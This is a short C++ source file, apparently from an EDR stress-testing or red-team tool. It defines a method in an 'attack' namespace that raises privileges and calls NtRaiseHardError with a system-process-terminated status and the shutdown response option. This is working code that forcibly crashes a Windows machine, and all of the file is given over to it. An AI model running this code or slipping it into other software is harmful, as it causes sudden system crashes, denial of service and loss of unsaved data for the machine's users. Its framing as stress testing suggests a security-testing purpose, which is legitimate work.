#include "edr_stress.h"
#include "ntdll.h"

#include <Windows.h>

#include <iostream>

namespace attack {

    void EDRStress::TriggerHardError() {

        BOOLEAN was_enabled;
        ULONG response;

        NTSTATUS status = ntdll_.RtlAdjustPrivilege(SE_TCB_PRIVILEGE, TRUE, FALSE, &was_enabled);
        if (status != STATUS_PRIVILEGE_NOT_HELD) {
            std::cout << "TCB privilege adjusted: 0x" << std::hex << status << std::endl;
        }
        ntdll_.RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &was_enabled);

        status = ntdll_.NtRaiseHardError(
            STATUS_SYSTEM_PROCESS_TERMINATED,
            0,
            0,
            NULL,
            6,
            &response
        );
    }


}